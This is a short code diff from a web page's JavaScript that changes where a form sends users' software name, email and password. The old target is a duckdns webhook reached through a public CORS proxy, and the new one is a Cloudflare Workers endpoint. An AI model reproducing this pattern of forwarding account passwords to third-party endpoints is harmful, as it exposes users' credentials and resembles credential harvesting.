@@ -218,8 +218,7 @@
       result.style.display = 'none';
 
       try {
-        const target = 'http://zdstudios.duckdns.org:5678/webhook/HW-Bot';
-        const res = await fetch(`https://api.allorigins.win/raw?url=${encodeURIComponent(target)}`, {
+        const res = await fetch('https://wandering-brook-94d0.zdstudio12345.workers.dev/', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ software, email, password })
